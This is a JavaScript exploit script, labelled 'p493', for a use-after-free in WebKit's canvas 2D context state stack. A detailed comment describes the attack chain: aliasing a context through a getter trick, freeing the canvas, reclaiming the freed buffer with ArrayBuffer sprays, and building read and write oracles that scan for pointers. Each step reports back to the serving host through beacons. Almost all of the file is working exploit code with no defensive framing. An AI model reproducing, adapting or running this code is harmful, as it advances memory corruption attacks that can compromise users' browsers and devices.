// p493 — Canvas UAF: m_stateStack heap-buffer reclaim
//
// Chain (source-verified, WebKit-1200):
//   1. Aliased pair (desynchronized-getter trick). dCtx1 + sprayX[idx1] are the
//      SAME CanvasRenderingContext2D C++ object.
//   2. save() xN through the live side -> ++m_unrealizedSaveCount. No vector ops.
//   3. REALIZE: setter write (lineWidth = different value). Getter does NOT
//      realize saves (Base.cpp: lineWidth() const -> state().lineWidth).
//      setLineWidth(): isfinite && >0 && !=current -> realizeSaves() ->
//      realizeSavesLoop() -> m_stateStack.append() x N.
//      Vector<State,1> grows 2,4,8,...,capDoubling; every step FREES the old
//      heap buffer; final cap for N=20/50/100 is 32/64/128 entries.
//   4. restore() xN -> removeLast() -> shrink(size-1) ONLY decrements size
//      (Vector.h shrink() never frees). Buffer survives with capacity cap.
//   5. Free: remove canvas from DOM + null refs + GC rounds. Destructor frees
//      BOTH the context object AND the retained stateStack buffer (cap x
//      sizeof(State)).
//   6. dCtx1 (dangling) reads state() -> m_stateStack.last() via the stale
//      m_buffer pointer -> whatever reclaims that slot is now State[0].
//   7. ORACLES:
//        a. READ:  dCtx1.lineWidth / globalAlpha / miterLimit -> raw garbage
//           doubles from reclaimed bytes.
//        b. WRITE: dCtx1.lineWidth = 777.25 -> setLineWidth writes the double
//           at State offset 48 into the reclaimed buffer. Scan sprayed ABs for
//           the exact u64 bit pattern -> deterministic hit + CONFIRM read.
//        c. STEP6: dCtx1.save() x2 + reallocate through dangling side (the
//           copy-ctor path is crash-prone — runs LAST, beacons flushed first).
//
// Size math: sizeof(State) ~ 344-480B (FontProxy = vptr(8) + FontCascade with
// big FontCascadeDescription(~136B); CanvasStyle=variant 16B; Color=8B;
// AffineTransform=48B; Vector<double>=24B). Freed buffer byte sizes:
//   A: 20 saves -> cap 32  -> ~ 32*S  (8960..17920)   step 512
//   B: 50 saves -> cap 64  -> ~ 64*S  (17920..35840)  step 1024
//   C: 100 saves-> cap 128 -> ~128*S  (35840..71680)  step 2048
//
// Beacon prefix: V493-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var bQ = [];

  function Q(tag, body) { bQ.push([tag, body || '']); }
  function flushBeacons() {
    for (var i = 0; i < bQ.length; i++) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', BASE + '/beacon/V493-' + bQ[i][0], false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send('[' + (Date.now() - T0) + 'ms] ' + bQ[i][1]);
      } catch(e) {}
    }
    bQ = [];
  }

  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V493-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  // u32 pair (little-endian lo,hi) of a double value via typed-array punning
  var f64buf = new Float64Array(1);
  var u32buf = new Uint32Array(f64buf.buffer);
  function dblLo(v) { f64buf[0] = v; return u32buf[0]; }
  function dblHi(v) { f64buf[0] = v; return u32buf[1]; }
  function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT', navigator.userAgent);

  var dangleKeep = [];   // keeps every dangling ctx ref alive across phases
  var sprayLadders = []; // keeps every AB spray alive across phases

  // ═══════════════════════════════════════════════════════════
  // runPhase(tag, N, ladder lo/hi/step perSize)
  // ═══════════════════════════════════════════════════════════
  function runPhase(tag, NSAVES, LO, HI, STEP, PER_SIZE) {

    B('PHASE-' + tag + '-START', 'saves=' + NSAVES + ',lo=' + LO + ',hi=' + HI + ',step=' + STEP + ',per=' + PER_SIZE);

    // ── 1. Aliased pair ──────────────────────────────────────
    var dCtx1 = null, lCtx1 = null;
    var tc1 = document.createElement('canvas');
    tc1.width = 10; tc1.height = 10;
    document.body.appendChild(tc1);

    var cc1 = 0, s1 = {};
    Object.defineProperty(s1, 'desynchronized', {
      get: function() { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
    });
    lCtx1 = tc1.getContext('2d', s1);

    if (!dCtx1) { B('PHASE-' + tag + '-ABORT', 'uaf1-fail'); return; }
    dangleKeep.push(dCtx1);

    // Same-type spray (canonical)
    var sprayC = [], sprayX = [];
    for (var i = 0; i < 200; i++) {
      var c = document.createElement('canvas');
      c.width = 10; c.height = 10;
      sprayC.push(c);
      var ctx = c.getContext('2d');
      ctx.lineWidth = 500 + i;
      sprayX.push(ctx);
    }

    var lw1 = dCtx1.lineWidth;
    if (typeof lw1 !== 'number' || lw1 < 500 || lw1 >= 700) {
      B('PHASE-' + tag + '-ABORT', 'alias-miss lw=' + lw1);
      return;
    }
    var idx1 = Math.round(lw1 - 500);
    var live = sprayX[idx1];
    B('PHASE-' + tag + '-ALIAS', 'idx=' + idx1);

    // ── 2. save() xN through live side (increments m_unrealizedSaveCount) ──
    var saveOk = 0, saveErr = '';
    for (var sv = 0; sv < NSAVES; sv++) {
      try { live.save(); saveOk++; } catch(e) { saveErr = e.message; break; }
    }
    B('PHASE-' + tag + '-SAVED', 'ok=' + saveOk + '/' + NSAVES + (saveErr ? ',err=' + saveErr : ''));
    if (saveOk < NSAVES) { flushBeacons(); return; }

    // ── 3. REALIZE via setter write (getter does NOT realize saves) ──
    //     setLineWidth: != current && finite && >0 -> realizeSaves() ->
    //     appends N states. Growth chain frees buffers 2S,4S,...,capS/2.
    var realized = false, rwErr = '';
    try {
      live.lineWidth = 4321.5;
      realized = true;
    } catch(e) { rwErr = e.message; }
    B('PHASE-' + tag + '-REALIZED', 'ok=' + realized + (rwErr ? ',err=' + rwErr : ''));

    // Full stack now: size = N+1, final retained heap buffer = cap entries.
    // Store sizes per entry for the profile record:
    var lastLw = -1;
    try { lastLw = live.lineWidth; } catch(e) {}
    // expected cap: smallest pow2 >= N+1 (doubling from inline 1)
    var cap = 2; var capIter = 1;
    while (cap < NSAVES + 1) { cap = cap * 2; capIter++; }
    B('PHASE-' + tag + '-PROFILE', 'entries=' + (NSAVES + 1) + ',expectedCap=' + cap +
      ',heapGrowthSteps=' + capIter + ',expectedFreedBytes=' + (cap * 420) + 'ish(344-480/entry)' +
      ',postLw=' + lastLw);

    // ── 4. restore() xN -> size back to 1 (buffer NOT shrunk / NOT freed) ──
    var resOk = 0, resErr = '';
    for (var rs = 0; rs < NSAVES; rs++) {
      try { live.restore(); resOk++; } catch(e) { resErr = e.message; break; }
    }
    B('PHASE-' + tag + '-RESTORED', 'ok=' + resOk + '/' + NSAVES + (resErr ? ',err=' + resErr : ''));
    if (resOk < NSAVES) { flushBeacons(); return; }

    // sanity: alias still reads marker? (buffer alive, size=1, State#0 intact)
    var postRestoreLw = -1;
    try { postRestoreLw = live.lineWidth; } catch(e) {}
    B('PHASE-' + tag + '-PRE-FREE-LW', 'postLw=' + postRestoreLw + ',expect-marker=' + (500 + idx1));

    // ── 5. Free canvas + stateStack buffer ────────────────────
    var aliasedCanvas = sprayC[idx1];
    if (aliasedCanvas && aliasedCanvas.parentNode) {
      aliasedCanvas.parentNode.removeChild(aliasedCanvas);
    }
    sprayC[idx1] = null;
    sprayX[idx1] = null;
    live = null;
    aliasedCanvas = null;

    // Aggressive GC (p490 pattern)
    for (var round = 0; round < 5; round++) {
      var junk = [];
      for (var g = 0; g < 4000; g++) {
        junk.push({a: new ArrayBuffer(32 + round * 16), b: [g]});
      }
      junk = null;
    }
    for (var round2 = 0; round2 < 3; round2++) {
      var junk2 = [];
      for (var g2 = 0; g2 < 2000; g2++) {
        junk2.push(new Float64Array(8));
      }
      junk2 = null;
    }
    B('PHASE-' + tag + '-FREED', 'idx=' + idx1);

    // ── 5b. Spray ladder ABs (target: cap x sizeof(State)) ──
    var ladder = [];
    for (var sz = LO; sz <= HI; sz += STEP) {
      for (var p = 0; p < PER_SIZE; p++) {
        var ab = new ArrayBuffer(sz);
        ladder.push({sz: sz, ab: ab, dv: new DataView(ab)});
      }
    }
    sprayLadders.push(ladder);
    B('PHASE-' + tag + '-SPRAYED', 'sizes=' + Math.ceil((HI - LO + 1) / STEP) + ',per=' + PER_SIZE +
      ',total=' + ladder.length);

    // ── 6a. ORACLE-READ through dCtx1 (stale m_buffer -> reclaimed State) ──
    var rdLw = 'throw', rdGa = 'throw', rdMl = 'throw', rdCap = 'throw';
    try { rdLw = dCtx1.lineWidth; } catch(e) { rdLw = 'throw:' + e.message; }
    try { rdGa = dCtx1.globalAlpha; } catch(e) { rdGa = 'throw:' + e.message; }
    try { rdMl = dCtx1.miterLimit; } catch(e) { rdMl = 'throw:' + e.message; }
    try { rdCap = dCtx1.lineCap; } catch(e) { rdCap = 'throw:' + e.message; }
    var clsLw = '';
    if (typeof rdLw === 'number' && rdLw >= 500 && rdLw < 700) clsLw = ' STILL-SPRAY';
    B('PHASE-' + tag + '-ORACLE-READ', 'lw=' + rdLw + ',ga=' + rdGa + ',miter=' + rdMl + ',cap=' + rdCap + clsLw);

    // ── 6b. ORACLE-WRITE: dCtx1.lineWidth = 777.25 ──
    //     setLineWidth writes double at State#0 offset 48 into reclaimed slot.
    var MJ = 777.25, MJ_LO = dblLo(MJ), MJ_HI = dblHi(MJ);
    var setOk = false, setErr = '';
    try { dCtx1.lineWidth = MJ; setOk = true; } catch(e) { setErr = e.message; }
    B('PHASE-' + tag + '-WRITE-SET', 'ok=' + setOk + (setErr ? ',err=' + setErr : '') +
      ',bits=' + hex32(MJ_HI) + hex32(MJ_LO));

    // scan every AB for exact u64 pattern at any 4-byte-aligned offset
    function scanLadder(pLo, pHi) {
      var hits = [];
      for (var li = 0; li < ladder.length; li++) {
        var sz2 = ladder[li].sz;
        for (var off = 0; off + 8 <= sz2; off += 4) {
          if (ladder[li].dv.getUint32(off, true) === pLo &&
              ladder[li].dv.getUint32(off + 4, true) === pHi) {
            hits.push({i: li, sz: sz2, off: off});
            return hits;
          }
        }
      }
      return hits;
    }

    var hits = scanLadder(MJ_LO, MJ_HI);
    if (hits.length) {
      var h = hits[0];
      var hv = ladder[h.i].dv;
      B('PHASE-' + tag + '-HIT', 'sz=' + h.sz + ',ab=' + h.i + ',off=' + h.off);

      // CONFIRM: read back through dCtx1 — expect exactly 777.25
      var rdBack = 'throw';
      try { rdBack = dCtx1.lineWidth; } catch(e) { rdBack = 'throw:' + e.message; }
      B('PHASE-' + tag + '-CONFIRM', 'readback=' + rdBack + ',expect=' + MJ + ',match=' + (rdBack === MJ));

      // dump head 64B + ptr-scan 0..256 of the hit AB
      var hexHead = [];
      for (var hh = 0; hh < 64; hh += 8) {
        hexHead.push(hh + ':' + hex32(hv.getUint32(hh + 4, true)) + hex32(hv.getUint32(hh, true)));
      }
      B('PHASE-' + tag + '-DUMP-HEAD', hexHead.join(','));
      var ptrScan = [];
      for (var ph2 = 0; ph2 < 256 && ph2 + 8 <= h.sz; ph2 += 8) {
        var lo2 = hv.getUint32(ph2, true), hi2 = hv.getUint32(ph2 + 4, true);
        if (lo2 !== 0 || hi2 !== 0) {
          ptrScan.push(ph2 + ':0x' + hex32(hi2) + hex32(lo2));
        }
      }
      B('PHASE-' + tag + '-PTR-SCAN', ptrScan.length ? ptrScan.join(',') : 'all-zero');
    } else {
      // fallback marker in case current-value NaN early-return blocked write
      var MJ2 = 8491.75, MJ2_LO = dblLo(MJ2), MJ2_HI = dblHi(MJ2);
      try { dCtx1.lineWidth = MJ2; } catch(e) {}
      var hits2 = scanLadder(MJ2_LO, MJ2_HI);
      var readBack2 = 'throw';
      try { readBack2 = dCtx1.lineWidth; } catch(e) {}
      B('PHASE-' + tag + '-MISS', 'fallback=' + MJ2 + ',hits2=' + hits2.length +
        ',readback2=' + readBack2 + ',bits2=' + hex32(MJ2_HI) + hex32(MJ2_LO));
      if (hits2.length) {
        var h2 = hits2[0];
        B('PHASE-' + tag + '-HIT2', 'sz=' + h2.sz + ',ab=' + h2.i + ',off=' + h2.off);
        var hv2 = ladder[h2.i].dv;
        var ptrScan2 = [];
        for (var p2 = 0; p2 < 256 && p2 + 8 <= h2.sz; p2 += 8) {
          var l3 = hv2.getUint32(p2, true), h3 = hv2.getUint32(p2 + 4, true);
          if (l3 !== 0 || h3 !== 0) ptrScan2.push(p2 + ':0x' + hex32(h3) + hex32(l3));
        }
        B('PHASE-' + tag + '-PTR-SCAN', ptrScan2.length ? ptrScan2.join(',') : 'all-zero');
      } else {
        // non-zero census: were ANY sprayed ABs touched at all?
        var nzTotal = 0, nzDetail = [];
        for (var ci = 0; ci < ladder.length && ci < 60; ci++) {
          var nz = 0;
          for (var co = 0; co + 8 <= ladder[ci].sz; co += 8) {
            if (ladder[ci].dv.getUint32(co, true) !== 0 ||
                ladder[ci].dv.getUint32(co + 4, true) !== 0) nz++;
          }
          if (nz > 0) { nzTotal++; if (nzDetail.length < 6) nzDetail.push('ab' + ci + '(sz=' + ladder[ci].sz + ')nz=' + nz); }
        }
        var nzTail = nzDetail.length ? ',' + nzDetail.join(';') : ',all-zero';
        B('PHASE-' + tag + '-NZ', 'nonzeroABs=' + nzTotal + nzTail);
      }
    }

    // ── 6c. STEP6: appended saves through dangling side (crash-prone — done
    //        LAST; all previous beacons already flushed) ──
    var s6 = '', s6Err = '';
    try { dCtx1.save(); dCtx1.save(); s6 = 'saved2'; } catch(e) { s6Err = e.message; }
    var lw6 = 'throw';
    try { lw6 = dCtx1.lineWidth; } catch(e) { lw6 = 'throw:' + e.message; }
    B('PHASE-' + tag + '-STEP6', 'saves=' + s6 + (s6Err ? ',err=' + s6Err : '') + ',lw=' + lw6);

    var hits6 = scanLadder(MJ_LO, MJ_HI);
    B('PHASE-' + tag + '-END', 'hits=' + hits.length + ',hits6=' + hits6.length);
    flushBeacons();
  }

  // ═══════════════════════════════════════════════════════════
  // RUN: A (20 saves) -> B (50) -> C (100)
  // ═══════════════════════════════════════════════════════════
  runPhase('A', 20, 8960, 17920, 512, 12);
  runPhase('B', 50, 17920, 35840, 1024, 10);
  runPhase('C', 100, 35840, 71680, 2048, 6);

  Q('DONE', 'all-phases-complete,kept=' + dangleKeep.length);
  flushBeacons();
})();
